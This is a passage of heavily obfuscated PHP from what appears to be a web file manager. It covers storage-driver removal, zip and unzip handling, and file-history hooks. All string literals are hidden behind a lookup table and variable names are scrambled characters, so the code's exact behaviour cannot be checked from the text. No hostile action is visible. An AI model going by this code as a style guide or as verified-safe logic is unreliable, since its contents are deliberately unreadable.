!1) { $Û ß´ Ü = substr($Û ß´ Ü, $„·’–‘ + 1); } } $Û ß´ Ü = LNG($™‚•Æ–ñ[1328]) . $Û ß´ Ü; if ($íûì‹©Û) { return $Û ß´ Ü; } show_json($Û ß´ Ü, !1); } public function driverListSystem() { $í«í’ =& $_SERVER[”øäÃÍª]; $¡´ÑÔ«ï = parent::listData(); $à‰ôÕÍ¢ = array(); foreach ($¡´ÑÔ«ï as $À‹Æì‚) { unset($À‹Æì‚[$í«í’[231]], $À‹Æì‚[$í«í’[88]]); if (!is_array($À‹Æì‚[$í«í’[6]])) { $À‹Æì‚[$í«í’[6]] = json_decode($À‹Æì‚[$í«í’[6]], !0); } $à‰ôÕÍ¢[] = $À‹Æì‚; } return $à‰ôÕÍ¢; } public function defaultDriver() { $ĞöÄùµÉ =& $_SERVER[”øäÃÍª]; $ÀÂ‹È¯ = parent::listData(); $‚ßŠÜù = array_filter_by_field($ÀÂ‹È¯, $ĞöÄùµÉ[37], 1); $‚ßŠÜù = $‚ßŠÜù[0]; if (!$‚ßŠÜù) { return array(); } if (!is_array($‚ßŠÜù[$ĞöÄùµÉ[6]])) { $‚ßŠÜù[$ĞöÄùµÉ[6]] = json_decode($‚ßŠÜù[$ĞöÄùµÉ[6]], !0); } return $‚ßŠÜù; } public function driverInfo($ã¯Ñ…½“) { $ãøıˆöŞ =& $_SERVER[”øäÃÍª]; $‹­×ú’‰ = array_to_keyvalue(parent::listData(), $ãøıˆöŞ[487]); if (!isset($‹­×ú’‰[$ã¯Ñ…½“])) { return !1; } $Êñ€Šˆê = $‹­×ú’‰[$ã¯Ñ…½“]; if (!is_array($Êñ€Šˆê[$ãøıˆöŞ[6]])) { $Êñ€Šˆê[$ãøıˆöŞ[6]] = json_decode($Êñ€Šˆê[$ãøıˆöŞ[6]], !0); } return $Êñ€Šˆê; } public function remove($ßîøòê) { $this->removeShareItems($ßîøòê); return parent::remove($ßîøòê); } public function removeWithFile($ùÔÆàÅß, $ÎÁ–Úøï, $Ñûİ¬ı¼, $üß¹’íé = false) { $¸ßìô„Å =& $_SERVER[”øäÃÍª]; ignore_timeout(); $›å¦±Å« = array($¸ßìô„Å[934] => $ùÔÆàÅß); $€ÖáíòÀ = Model($¸ßìô„Å[568]); if (isset($GLOBALS[$¸ßìô„Å[2491]])) { $ç¶‹×Ò = $GLOBALS[$¸ßìô„Å[2491]]; } else { $ç¶‹×Ò = $€ÖáíòÀ->where($›å¦±Å«)->field(array($¸ßìô„Å[2390] => $¸ßìô„Å[2096], $¸ßìô„Å[2463] => $¸ßìô„Å[79]))->find(); } $’¨æÁÂÕ = intval($ç¶‹×Ò[$¸ßìô„Å[2096]]); $«”•„»÷ = intval($ç¶‹×Ò[$¸ßìô„Å[79]]); $ûŞ˜ÙÀò = $ÎÁ–Úøï . $¸ßìô„Å[2492] . $ùÔÆàÅß; $çßùªº‚ = LNG($ÎÁ–Úøï == $¸ßìô„Å[651] ? $¸ßìô„Å[2493] : $¸ßìô„Å[2494]); $š‘Š‘¾ = new TaskFileTransfer($ûŞ˜ÙÀò, $¸ßìô„Å[213], $’¨æÁÂÕ, $çßùªº‚ . $¸ßìô„Å[476] . $Ñûİ¬ı¼[$¸ßìô„Å[32]] . $¸ßìô„Å[212] . $ùÔÆàÅß); $š‘Š‘¾->task[$¸ßìô„Å[873]] = (double) $«”•„»÷; $èæ÷© = KodIO::defaultDriver(); $Ê‡ˆ—˜™ = $èæ÷©[$¸ßìô„Å[487]]; $ŒùõÂˆ = 1; $úá©¿† = 5000; $˜ıöüÀ€ = $õ¸£³„Ê = $á¾êĞÁ = array(); $Üæ°“Úœ = $€ÖáíòÀ->where($›å¦±Å«)->field($¸ßìô„Å[2495])->selectPage($úá©¿†, $ŒùõÂˆ); $¤¼ö©† = intval($Üæ°“Úœ[$¸ßìô„Å[443]][$¸ßìô„Å[445]]); while ($Üæ°“Úœ && $ŒùõÂˆ <= $¤¼ö©†) { foreach ($Üæ°“Úœ[$¸ßìô„Å[446]] as $·Úá¢²) { $®áıÈíÔ = $·Úá¢²[$¸ßìô„Å[565]]; if ($üß¹’íé) { $õ¸£³„Ê[] = $®áıÈíÔ; continue; } $ÕÎœ›š = $·Úá¢²[$¸ßìô„Å[87]]; $ÚÛè¦éæ = get_path_father($ÕÎœ›š); $á¾êĞÁ[] = $ÚÛè¦éæ; $ÚÛè¦éæ = str_replace("\x7b\151\157\x3a{$ùÔÆàÅß}\175\x2f", "\173\x69\x6f\x3a{$Ê‡ˆ—˜™}\x7d\x2f", $ÚÛè¦éæ); if (!IO::exist($ÕÎœ›š)) { $˜ıöüÀ€[] = $®áıÈíÔ; $š‘Š‘¾->updateFileEnd($·Úá¢²[$¸ßìô„Å[32]], $·Úá¢²[$¸ßìô„Å[79]]); write_log($¸ßìô„Å[2496] . $ÕÎœ›š, $¸ßìô„Å[2075]); continue; } $Ó‰å«ñş = IO::move($ÕÎœ›š, $ÚÛè¦éæ, REPEAT_RENAME); if (!$Ó‰å«ñş) { $õ¸£³„Ê[] = $®áıÈíÔ; $š‘Š‘¾->updateFileEnd($·Úá¢²[$¸ßìô„Å[32]], $·Úá¢²[$¸ßìô„Å[79]]); write_log($¸ßìô„Å[2497] . $ÕÎœ›š, $¸ßìô„Å[2075]); continue; } $ª¾öƒÜŠ = array($¸ßìô„Å[934] => $Ê‡ˆ—˜™, $¸ßìô„Å[87] => $Ó‰å«ñş); $€ÖáíòÀ->where(array($¸ßìô„Å[565] => $®áıÈíÔ))->save($ª¾öƒÜŠ); } $ŒùõÂˆ++; $Üæ°“Úœ = $€ÖáíòÀ->where($›å¦±Å«)->field($¸ßìô„Å[2495])->selectPage($úá©¿†, $ŒùõÂˆ); } $í½˜ê¨ = $š‘Š‘¾->task; if (!$üß¹’íé) { Cache::set($ûŞ˜ÙÀò, $í½˜ê¨); } $š‘Š‘¾->end(); $˜ıöüÀ€ = array_unique($˜ıöüÀ€); $õ¸£³„Ê = array_unique($õ¸£³„Ê); if (!$üß¹’íé && ($˜ıöüÀ€ || $õ¸£³„Ê)) { $—¿œ¤¡™ = array(); if ($˜ıöüÀ€) { $—¿œ¤¡™[] = sprintf(LNG($¸ßìô„Å[2498]), count($˜ıöüÀ€)); } if ($õ¸£³„Ê) { $—¿œ¤¡™[] = sprintf(LNG($¸ßìô„Å[2499]), count($õ¸£³„Ê)); } $—¿œ¤¡™ = sprintf(LNG($¸ßìô„Å[2500]), implode($¸ßìô„Å[1542], $—¿œ¤¡™)) . $¸ßìô„Å[2501] . date($¸ßìô„Å[2502]) . $¸ßìô„Å[2503]; if ($ÎÁ–Úøï == $¸ßìô„Å[1286]) { $—¿œ¤¡™ .= $¸ßìô„Å[2504] . LNG($¸ßìô„Å[2505]); } else { $—¿œ¤¡™ = LNG($¸ßìô„Å[2506]) . $¸ßìô„Å[2507] . $—¿œ¤¡™; } $í½˜ê¨[$¸ßìô„Å[1323]] = $—¿œ¤¡™; Cache::set($ûŞ˜ÙÀò, $í½˜ê¨); unset($Ñûİ¬ı¼[$¸ßìô„Å[6]]); $İüş’÷Ë = array($¸ßìô„Å[487] => $ùÔÆàÅß, $¸ßìô„Å[2379] => $¸ßìô„Å[651], $¸ßìô„Å[32] => $Ñûİ¬ı¼[$¸ßìô„Å[32]], $¸ßìô„Å[96] => $Ñûİ¬ı¼[$¸ßìô„Å[96]]); Hook::trigger($¸ßìô„Å[1944], array($¸ßìô„Å[1345] => $İüş’÷Ë, $¸ßìô„Å[1355] => !0)); show_json($—¿œ¤¡™, !1, 100111); } if ($ÎÁ–Úøï == $¸ßìô„Å[651]) { return !0; } if ($˜ıöüÀ€ || $õ¸£³„Ê) { $Ï®ŒÂ¹… = array_merge($˜ıöüÀ€, $õ¸£³„Ê); $Ï®ŒÂ¹… = array_filter(array_unique($Ï®ŒÂ¹…)); $this->removeByFileID($Ï®ŒÂ¹…); } if ($á¾êĞÁ) { $á¾êĞÁ = array_filter(array_unique($á¾êĞÁ)); foreach ($á¾êĞÁ as $ÕÎœ›š) { $ç¶‹×Ò = IO::has($ÕÎœ›š, !0); if (!$ç¶‹×Ò[$¸ßìô„Å[239]] && !$ç¶‹×Ò[$¸ßìô„Å[240]]) { IO::remove($ÕÎœ›š); } } } return $this->remove($ùÔÆàÅß); } private function removeByFileID($ÌĞ’Á‹Ã = array()) { $éığõ„ö =& $_SERVER[”øäÃÍª]; if (empty($ÌĞ’Á‹Ã)) { return; } $äùÍÑ‡ = array($éığõ„ö[565] => array($éığõ„ö[7], $ÌĞ’Á‹Ã)); $ÊÑ¯§æˆ = Model($éığõ„ö[1488])->where($äùÍÑ‡)->field($éığõ„ö[2452])->select(); if (!$ÊÑ¯§æˆ) { return Model($éığõ„ö[568])->remove($ÌĞ’Á‹Ã); } $ÊÑ¯§æˆ = array_to_keyvalue($ÊÑ¯§æˆ, $éığõ„ö[191], $éığõ„ö[565]); foreach ($ÊÑ¯§æˆ as $×ğ²Ö­¤ => $Š¯£šÚ) { Model($éığõ„ö[941])->removeNow($×ğ²Ö­¤, !1); } $¿ÇÎ³ ı = array_diff($ÌĞ’Á‹Ã, array_unique(array_values($ÊÑ¯§æˆ))); if ($¿ÇÎ³ ı) { return Model($éığõ„ö[568])->remove($¿ÇÎ³ ı); } } private function removeShareItems($¿î›İğá) { $ğ‡òíç =& $_SERVER[”øäÃÍª]; $Õâêóü = "\173\x69\157\x3a{$¿î›İğá}\175\57"; $úÎß¥Æ = array($ğ‡òíç[191] => 0, $ğ‡òíç[591] => array($ğ‡òíç[473], "{$Õâêóü}\45")); $ê×Å»ÇÔ = Model($ğ‡òíç[1518])->where($úÎß¥Æ)->field($ğ‡òíç[695])->select(); if (empty($ê×Å»ÇÔ)) { return; } $ÜÌ®„Ç™ = array_to_keyvalue($ê×Å»ÇÔ, $ğ‡òíç[12], $ğ‡òíç[695]); Model($ğ‡òíç[694])->remove($ÜÌ®„Ç™); } } goto FĞ©ÍìÍ ª; dÔÅğì : class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¦ªà†ï; if ($¦ªà†ï) { return $¦ªà†ï; } $ìÊÆš«à = IO::init($_SERVER[”øäÃÍª][8]); return $ìÊÆš«à; } private static function iconvSystem($°‰‹·æú) { return self::local()->iconvSystem($°‰‹·æú); } private static function iconvApp($÷¹¯÷Ûñ) { return self::local()->iconvApp($÷¹¯÷Ûñ); } public static function zipFolder($èÆ…êß, $ª™òò—¨ = "\x7a\x69\x70", $„§ë¥ä‰ = '', $ÚÇÜ”äÈ = REPEAT_RENAME) { $Åâ‰­Èó =& $_SERVER[”øäÃÍª]; $‘±ğ÷È = IO::listPath($èÆ…êß); if (!$‘±ğ÷È) { return !1; } $‘±ğ÷È = array_merge($‘±ğ÷È[$Åâ‰­Èó[85]], $‘±ğ÷È[$Åâ‰­Èó[86]]); return self::zip($‘±ğ÷È, $ª™òò—¨, $„§ë¥ä‰, $ÚÇÜ”äÈ); } public static function zip($›¤¹Î¡½, $Ö„Ëˆ› = "\x7a\151\x70", $æ¨•×‚ù = '', $ŞæĞúÅ° = REPEAT_RENAME) { $Ùİ¼ß±À =& $_SERVER[”øäÃÍª]; if (is_string($›¤¹Î¡½) && $›¤¹Î¡½) { $›¤¹Î¡½ = array(array($Ùİ¼ß±À[87] => $›¤¹Î¡½)); } $ï†ã’ß˜ = self::init($›¤¹Î¡½[0][$Ùİ¼ß±À[87]]); $İ´İ†É“ = self::info($›¤¹Î¡½[0][$Ùİ¼ß±À[87]]); $Î€õÊ°Ø = $Ùİ¼ß±À[12]; $©ÁÒá¤Ğ = $Ùİ¼ß±À[12]; $Â¡‘¹‹ = $Ùİ¼ß±À[12]; if ($æ¨•×‚ù && substr($æ¨•×‚ù, -1, 1) != $Ùİ¼ß±À[8]) { $©ÁÒá¤Ğ = get_path_father($æ¨•×‚ù); $Â¡‘¹‹ = get_path_this($æ¨•×‚ù); } else { $©ÁÒá¤Ğ = self::pathFather($İ´İ†É“[$Ùİ¼ß±À[87]]); $Â¡‘¹‹ = $İ´İ†É“[$Ùİ¼ß±À[32]] . $Ùİ¼ß±À[10] . $Ö„Ëˆ›; if (count($›¤¹Î¡½) > 1) { $Úä×Ş‰Ã = IO::info($©ÁÒá¤Ğ); $Â¡‘¹‹ = $Úä×Ş‰Ã[$Ùİ¼ß±À[32]] . $Ùİ¼ß±À[10] . $Ö„Ëˆ›; } if ($æ¨•×‚ù) { $©ÁÒá¤Ğ = $æ¨•×‚ù; } } if ($ï†ã’ß˜->getType() == $Ùİ¼ß±À[106]) { $£è‡Ê‡ø = self::init($©ÁÒá¤Ğ); $É…¨Îºš = $£è‡Ê‡ø->getType() == $Ùİ¼ß±À[106] ? $©ÁÒá¤Ğ : get_path_father($ï†ã’ß˜->path); $É…¨Îºš = IO::getPathInner($É…¨Îºš); $É…¨Îºš = rtrim($É…¨Îºš, $Ùİ¼ß±À[8]) . $Ùİ¼ß±À[8]; mk_dir($É…¨Îºš); } else { $Î€õÊ°Ø = TEMP_FILES . $Ùİ¼ß±À[1324] . time() . rand_string(8) . $Ùİ¼ß±À[8]; mk_dir($Î€õÊ°Ø); file_put_contents($Î€õÊ°Ø . $Ùİ¼ß±À[1325], $Ùİ¼ß±À[12]); $É…¨Îºš = $Î€õÊ°Ø; } $º‹ó¼™¿ = IO::info($É…¨Îºš); if (!$º‹ó¼™¿ || !$º‹ó¼™¿[$Ùİ¼ß±À[233]]) { show_json(LNG($Ùİ¼ß±À[1326]), !1); } $ø±Õ‡¼ = self::zipFileList($›¤¹Î¡½, $Î€õÊ°Ø); foreach ($ø±Õ‡¼ as $Á»‰˜’ => $ÒÈÉÜû) { $ø±Õ‡¼[$Á»‰˜’] = self::iconvSystem($ÒÈÉÜû); } $²ò“Ğ¸ = get_filename_auto($É…¨Îºš . $Â¡‘¹‹, $Ùİ¼ß±À[12], $ŞæĞúÅ°); KodArchive::create(self::iconvSystem($²ò“Ğ¸), $ø±Õ‡¼); if (!IO::exist($²ò“Ğ¸)) { if ($Î€õÊ°Ø) { del_dir($Î€õÊ°Ø); } write_log($Ùİ¼ß±À[1327] . $²ò“Ğ¸, $Ùİ¼ß±À[388]); show_json(LNG($Ùİ¼ß±À[1328]), !1); } if (!$Î€õÊ°Ø) { return $²ò“Ğ¸; } $Õ•ºØãØ = self::move($²ò“Ğ¸, $©ÁÒá¤Ğ, $ŞæĞúÅ°); if ($Î€õÊ°Ø) { del_dir($Î€õÊ°Ø); } if (!$²ò“Ğ¸) { write_log($Ùİ¼ß±À[1329] . $²ò“Ğ¸ . $Ùİ¼ß±À[1330] . $©ÁÒá¤Ğ, $Ùİ¼ß±À[388]); show_json(LNG($Ùİ¼ß±À[1328]), !1); } return $Õ•ºØãØ; } public static function unzip($‘Ëƒ²Ó‘, $óÊŒãê , $šÂ™› ß = "\x2d\61", $å‘¬‹‰œ = "\162\145\160\x6c\141\x63\x65") { $Æ€Ç»¶× =& $_SERVER[”øäÃÍª]; $“™·æëı = parent::info($‘Ëƒ²Ó‘); if (!$“™·æëı) { show_json(LNG($Æ€Ç»¶×[1331]), !1); } $†®Ó©Äğ = IO::infoFullSimple($óÊŒãê ); if (!$†®Ó©Äğ) { $óÊŒãê  = IO::mkdir($óÊŒãê ); } if (isset($†®Ó©Äğ[$Æ€Ç»¶×[191]]) && trim($†®Ó©Äğ[$Æ€Ç»¶×[87]], $Æ€Ç»¶×[8]) != trim($óÊŒãê , $Æ€Ç»¶×[8])) { $éğƒõ®“ = KodIO::make($†®Ó©Äğ[$Æ€Ç»¶×[190]]); $Òûİîë = IO::fileNameAuto($éğƒõ®“, $†®Ó©Äğ[$Æ€Ç»¶×[32]], REPEAT_RENAME_FOLDER, !0); $óÊŒãê  = IO::mkdir($éğƒõ®“ . $Òûİîë); } $šÂ™› ß = $šÂ™› ß && $šÂ™› ß != $Æ€Ç»¶×[1332] ? @json_decode($šÂ™› ß, !0) : -1; $÷Á˜Ö†› = self::unzipPart($‘Ëƒ²Ó‘, $šÂ™› ß); if (!$÷Á˜Ö†› || !IO::exist($÷Á˜Ö†›[$Æ€Ç»¶×[230]])) { show_json(LNG($Æ€Ç»¶×[105]), !1); } $•ùª÷Ö‘ = $÷Á˜Ö†›[$Æ€Ç»¶×[1333]][count($÷Á˜Ö†›[$Æ€Ç»¶×[1333]]) - 1]; if ($•ùª÷Ö‘[$Æ€Ç»¶×[1261]] == -1 || substr($•ùª÷Ö‘[$Æ€Ç»¶×[32]], -1, 1) == $Æ€Ç»¶×[8]) { $¦¯ê÷Œ = $÷Á˜Ö†›[$Æ€Ç»¶×[1334]] . rand_string(10) . $Æ€Ç»¶×[8]; mk_dir($¦¯ê÷Œ); $¤ôÇÈÖ = count($÷Á˜Ö†›[$Æ€Ç»¶×[1333]]) == 1 ? IO::ext($‘Ëƒ²Ó‘) : get_path_ext($÷Á˜Ö†›[$Æ€Ç»¶×[230]]); $¢­¡Â = KodArchive::extract(self::iconvSystem($÷Á˜Ö†›[$Æ€Ç»¶×[230]]), $¦¯ê÷Œ, $•ùª÷Ö‘[$Æ€Ç»¶×[1261]], $Òûİîë, $¤ôÇÈÖ); self::unzipErrorCheck($¢­¡Â, array($Æ€Ç»¶×[1335], $‘Ëƒ²Ó‘, $¤ôÇÈÖ, $óÊŒãê , $÷Á˜Ö†›)); Hook::trigger($Æ€Ç»¶×[1336], $¦¯ê÷Œ); recursion_dir($¦¯ê÷Œ, $Â…«“Ş­, $Ï²«Á¬‹, 0); $®ÑÇ’¤† = array_merge($Â…«“Ş­, $Ï²«Á¬‹); $ğùö¦ = array(); foreach ($®ÑÇ’¤† as $„éÉ½³¾) { $äâ÷ÁÑ½ = IO::move(self::iconvApp($„éÉ½³¾), $óÊŒãê , $å‘¬‹‰œ); if ($äâ÷ÁÑ½) { $ğùö¦[] = $äâ÷ÁÑ½; } } del_dir($¦¯ê÷Œ); } else { $äâ÷ÁÑ½ = IO::move($÷Á˜Ö†›[$Æ€Ç»¶×[230]], $óÊŒãê , $å‘¬‹‰œ, get_path_this($•ùª÷Ö‘[$Æ€Ç»¶×[32]])); if ($äâ÷ÁÑ½) { $ğùö¦[] = $äâ÷ÁÑ½; } } return $ğùö¦ ? $ğùö¦ : !1; } public static function unzipList($ÃŸŠ‘´‘) { $İËšĞ‰ =& $_SERVER[”øäÃÍª]; $Ø˜½ØÈ“ = isset($ÃŸŠ‘´‘[$İËšĞ‰[1337]]) ? $ÃŸŠ‘´‘[$İËšĞ‰[1337]] : !1; $ç¼ëìÖ = isset($ÃŸŠ‘´‘[$İËšĞ‰[1261]]) ? @json_decode($ÃŸŠ‘´‘[$İËšĞ‰[1261]], !0) : -1; $¡÷¥º´¾ = self::unzipPart($ÃŸŠ‘´‘[$İËšĞ‰[87]], $ç¼ëìÖ); if (!$¡÷¥º´¾ || !IO::exist($¡÷¥º´¾[$İËšĞ‰[230]])) { show_json(LNG($İËšĞ‰[105]), !1); } $“Å·üØ» = $¡÷¥º´¾[$İËšĞ‰[1333]][count($¡÷¥º´¾[$İËšĞ‰[1333]]) - 1]; $³°ÚÁ¨ = in_array(IO::ext($¡÷¥º´¾[$İËšĞ‰[230]]), array($İËšĞ‰[388], $İËšĞ‰[1338], $İËšĞ‰[1339], $İËšĞ‰[1340], $İËšĞ‰[1341], $İËšĞ‰[1342])); if (!$Ø˜½ØÈ“ && ($“Å·üØ»[$İËšĞ‰[1261]] == -1 || $³°ÚÁ¨)) { $¥çÉÑÆ = $¡÷¥º´¾[$İËšĞ‰[1334]] . get_path_this($¡÷¥º´¾[$İËšĞ‰[230]]) . $İËšĞ‰[1343]; if (!IO::exist($¥çÉÑÆ)) { $í€Æığö = $“Å·üØ»[$İËšĞ‰[1261]] == -1 ? get_path_ext(IO::pathThis($ÃŸŠ‘´‘[$İËšĞ‰[87]])) : get_path_ext($¡÷¥º´¾[$İËšĞ‰[230]]); $¼Ò€ˆ³ı = KodArchive::listContent(self::iconvSystem($¡÷¥º´¾[$İËšĞ‰[230]]), !0, $í€Æığö); self::unzipErrorCheck($¼Ò€ˆ³ı, array($İËšĞ‰[1344], $ÃŸŠ‘´‘, $¡÷¥º´¾)); @file_put_contents($¥çÉÑÆ, json_encode($¼Ò€ˆ³ı[$İËšĞ‰[1345]])); } return @json_decode(IO::getContent($¥çÉÑÆ), !0); } IO::fileOut($¡÷¥º´¾[$İËšĞ‰[230]], $Ø˜½ØÈ“, get_path_this($“Å·üØ»[$İËšĞ‰[32]])); die; } private static function zipFileList($†ÂØÆÙö, $š­‡Ü¥´ = false) { $È¦Û…î¢ =& $_SERVER[”øäÃÍª]; $È‚áÌÒ½ = array(); foreach ($†ÂØÆÙö as $Œğ‰æô) { $í‘¦†Ø = $Œğ‰æô[$È¦Û…î¢[87]]; if ($š­‡Ü¥´) { $í‘¦†Ø = self::copy($Œğ‰æô[$È¦Û…î¢[87]], $š­‡Ü¥´, $È¦Û…î¢[935]); } else { $Ç‚œî×‘ = self::init($Œğ‰æô[$È¦Û…î¢[87]]); if ($Ç‚œî×‘->getType() == $È¦Û…î¢[106]) { $í‘¦†Ø = $Ç‚œî×‘->path; } } if ($í‘¦†Ø && self::local()->exist($í‘¦†Ø)) { $È‚áÌÒ½[$Œğ‰æô[$È¦Û…î¢[87]]] = $í‘¦†Ø; } } if (!empty($È‚áÌÒ½)) { return array_values($È‚áÌÒ½); } show_json(LNG($È¦Û…î¢[1303]), !1); } private static function localFilePath($•Ìêı‰Ş) { $ò¾É¿ÂÚ =& $_SERVER[”øäÃÍª]; $à€Ï›Ëş = KodIO::parse($•Ìêı‰Ş); if ($à€Ï›Ëş[$ò¾É¿ÂÚ[33]] == KodIO::KOD_SOURCE) { $¼µóºî¥ = Model($ò¾É¿ÂÚ[941])->fileInfoGet(KodIO::sourceID($•Ìêı‰Ş)); if (!$¼µóºî¥[$ò¾É¿ÂÚ[87]]) { show_json($ò¾É¿ÂÚ[1346], !1); } $•Ìêı‰Ş = $¼µóºî¥[$ò¾É¿ÂÚ[87]]; } $Òú°¾× = self::init($•Ìêı‰Ş); if ($Òú°¾×->pathParse[$ò¾É¿ÂÚ[1289]]) { $•Ìêı‰Ş = $Òú°¾×->pathParse[$ò¾É¿ÂÚ[1289]]; $Òú°¾× = self::init($•Ìêı‰Ş); } $ôüŒÏ” = $Òú°¾×->getType(); if ($ôüŒÏ” == $ò¾É¿ÂÚ[106] || $ôüŒÏ” == $ò¾É¿ÂÚ[1347]) { if (!$Òú°¾×->exist($Òú°¾×->path)) { show_json(LNG($ò¾É¿ÂÚ[105]), !1); } return $Òú°¾×->path; } return !1; } public static function unzipPart($”´ÕıªÌ, $³…ôÎªŞ = -1) { $ƒ¡×¿â¬ =& $_SERVER[”øäÃÍª]; $¯úÈÖË = IO::pathThis($”´ÕıªÌ); if (!$³…ôÎªŞ || $³…ôÎªŞ == -1) { $Š¿¬Ì²‘ = array(array($ƒ¡×¿â¬[32] => $¯úÈÖË, $ƒ¡×¿â¬[1261] => -1)); $Š¿¬Ì²‘[0][$ƒ¡×¿â¬[1348]] = $Š¿¬Ì²‘[0][$ƒ¡×¿â¬[32]]; } else { if (is_array($³…ôÎªŞ)) { $Š¿¬Ì²‘ = $³…ôÎªŞ; $Âåî´Ô† = count($Š¿¬Ì²‘) - 1; for ($İ¡Å = 0; $İ¡Å <= $Âåî´Ô†; $İ¡Å++) { $ÑÃÓ±¶ = $Š¿¬Ì²‘[$İ¡Å]; $¡’³ù´’ = get_path_this($ÑÃÓ±¶[$ƒ¡×¿â¬[32]]) . (checkExtSafe($ÑÃÓ±¶[$ƒ¡×¿â¬[32]]) ? $ƒ¡×¿â¬[12] : $ƒ¡×¿â¬[1349]); $Š¿¬Ì²‘[$İ¡Å][$ƒ¡×¿â¬[1348]] = $ƒ¡×¿â¬[1350] . intval($ÑÃÓ±¶[$ƒ¡×¿â¬[1261]]) . $ƒ¡×¿â¬[476] . $¡’³ù´’; if ($İ¡Å == 0) { continue; } $Š¿¬Ì²‘[$İ¡Å][$ƒ¡×¿â¬[1348]] = $Š¿¬Ì²‘[$İ¡Å - 1][$ƒ¡×¿â¬[1348]] . $ƒ¡×¿â¬[1351] . $Š¿¬Ì²‘[$İ¡Å][$ƒ¡×¿â¬[1348]]; } } } if (!is_array($Š¿¬Ì²‘) || count($Š¿¬Ì²‘) == 0) { return !1; } $Ø´’ƒà  = $Š¿¬Ì²‘[count($Š¿¬Ì²‘) - 1]; if (!IO::exist($”´ÕıªÌ)) { return !1; } $®†¯¼éˆ = TEMP_FILES . $ƒ¡×¿â¬[1352] . kodIO::hashPathSafe($”´ÕıªÌ) . $ƒ¡×¿â¬[8]; $Œ¢ĞĞû˜ = $®†¯¼éˆ . $Ø´’ƒà [$ƒ¡×¿â¬[1348]]; mk_dir($®†¯¼éˆ); file_put_contents(TEMP_FILES . $ƒ¡×¿â¬[1325], $ƒ¡×¿â¬[12]); if (IO::exist($Œ¢ĞĞû˜)) { return array($ƒ¡×¿â¬[230] => $Œ¢ĞĞû˜, $ƒ¡×¿â¬[1333] => $Š¿¬Ì²‘, $ƒ¡×¿â¬[1334] => $®†¯¼éˆ); } $”á··½Ş = self::localFilePath($”´ÕıªÌ); if (!$”á··½Ş) { $”á··½Ş = $®†¯¼éˆ . $ƒ¡×¿â¬[1353]; if (!IO::exist($”á··½Ş)) { self::copy($”´ÕıªÌ, $®†¯¼éˆ, !1, get_path_this($”á··½Ş)); } } if (!$”á··½Ş || !IO::exist($”á··½Ş)) { return !1; } if ($Ø´’ƒà [$ƒ¡×¿â¬[1261]] == -1) { return array($ƒ¡×¿â¬[230] => $”á··½Ş, $ƒ¡×¿â¬[1333] => $Š¿¬Ì²‘, $ƒ¡×¿â¬[1334] => $®†¯¼éˆ); } $òÊÂöçè = $”á··½Ş; foreach ($Š¿¬Ì²‘ as $İ¡Å => $ÑÃÓ±¶) { if (!$ÑÃÓ±¶ || $ÑÃÓ±¶[$ƒ¡×¿â¬[1261]] == $ƒ¡×¿â¬[1332]) { break; } if (substr($ÑÃÓ±¶[$ƒ¡×¿â¬[32]], -1, 1) == $ƒ¡×¿â¬[8]) { break; } $„Ø‡ƒ²ƒ = in_array(get_path_ext($ÑÃÓ±¶[$ƒ¡×¿â¬[1348]]), array($ƒ¡×¿â¬[388], $ƒ¡×¿â¬[1338], $ƒ¡×¿â¬[1339], $ƒ¡×¿â¬[1340], $ƒ¡×¿â¬[1341], $ƒ¡×¿â¬[1342])); $ñå³ƒ¨š = $İ¡Å == count($Š¿¬Ì²‘) - 1 && $„Ø‡ƒ²ƒ; $É«Å³³ = $®†¯¼éˆ . $ÑÃÓ±¶[$ƒ¡×¿â¬[1348]]; $ñüÚÌÈê = $®†¯¼éˆ . get_path_this($ÑÃÓ±¶[$ƒ¡×¿â¬[32]]); if (IO::exist($É«Å³³)) { $òÊÂöçè = $É«Å³³; continue; } $ŒÊÏ›áÑ = $İ¡Å == 0 ? get_path_ext($¯úÈÖË) : get_path_ext($òÊÂöçè); $Ë¢Ñƒ‰ü = KodArchive::extract(self::iconvSystem($òÊÂöçè), $®†¯¼éˆ, $ÑÃÓ±¶[$ƒ¡×¿â¬[1261]], $Ö»å°ª, $ŒÊÏ›áÑ); self::unzipErrorCheck($Ë¢Ñƒ‰ü, array($ƒ¡×¿â¬[1354], $”´ÕıªÌ, $Š¿¬Ì²‘, $ÑÃÓ±¶, $É«Å³³)); if (IO::exist($ñüÚÌÈê)) { IO::rename($ñüÚÌÈê, get_path_this($É«Å³³)); } $òÊÂöçè = $É«Å³³; } $Œ¢ĞĞû˜ = $òÊÂöçè; return array($ƒ¡×¿â¬[230] => $òÊÂöçè, $ƒ¡×¿â¬[1333] => $Š¿¬Ì²‘, $ƒ¡×¿â¬[1334] => $®†¯¼éˆ); } private static function unzipErrorCheck($ëÈ¯Ö±ş, $¤†Ğ½š¸ = false) { $â³¼ÅÔ =& $_SERVER[”øäÃÍª]; if ($ëÈ¯Ö±ş[$â³¼ÅÔ[1355]]) { return !0; } write_log(array($â³¼ÅÔ[1356], $ëÈ¯Ö±ş, $¤†Ğ½š¸), $â³¼ÅÔ[1357]); $‡ïÛÉÕÈ = is_array($ëÈ¯Ö±ş[$â³¼ÅÔ[1345]]) ? json_encode($ëÈ¯Ö±ş[$â³¼ÅÔ[1345]]) : $ëÈ¯Ö±ş[$â³¼ÅÔ[1345]]; show_json($â³¼ÅÔ[1358] . $‡ïÛÉÕÈ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ş‹«¥² =& $_SERVER[”øäÃÍª]; $äÊç•­ = $GLOBALS[$Ş‹«¥²[6]][$Ş‹«¥²[92]]; if ($äÊç•­[$Ş‹«¥²[1359]] != 1) { return; } if ($äÊç•­[$Ş‹«¥²[1360]] <= 0) { return; } if (isset($_REQUEST[$Ş‹«¥²[1361]]) && $_REQUEST[$Ş‹«¥²[1361]] == $Ş‹«¥²[91]) { return; } Hook::bind($Ş‹«¥²[1362], $Ş‹«¥²[1363]); Hook::bind($Ş‹«¥²[1364], $Ş‹«¥²[1365]); Hook::bind($Ş‹«¥²[1366], $Ş‹«¥²[1367]); Hook::bind($Ş‹«¥²[1368], $Ş‹«¥²[1369]); Hook::bind($Ş‹«¥²[1370], $Ş‹«¥²[1371]); Hook::bind($Ş‹«¥²[1372], $Ş‹«¥²[1373]); } public static function eventBeforeUpload($»¨Áë) { if ($»¨Áë[3] && $»¨Áë[3] != REPEAT_REPLACE) { return; } $À‡ª¦½ı = self::parsePath($»¨Áë[0]); if (!$À‡ª¦½ı) { return; } self::add($À‡ª¦½ı); } public static function eventBeforeEdit($°Š¨Ááş) { $²ˆÛªçÜ = self::parsePath($°Š¨Ááş[0]); if 